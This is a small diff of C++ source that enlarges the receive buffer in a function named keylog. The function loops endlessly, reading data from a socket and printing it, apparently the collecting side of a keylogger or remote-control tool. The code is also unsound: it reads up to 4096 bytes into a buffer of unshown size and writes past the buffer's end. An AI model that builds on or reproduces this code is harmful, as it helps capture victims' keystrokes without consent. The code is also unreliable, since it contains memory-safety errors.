@@ -46,7 +46,7 @@ int cmd(const char *str) {
 
 void keylog(int fd, char buf[]) {
     while (1) {
-        recv(fd, buf, 2048, 0);
+        recv(fd, buf, 4096, 0);
         std::cout << buf;
         memset(buf, 0, MAX*sizeof(buf[0]));
         buf[MAX] = {0};
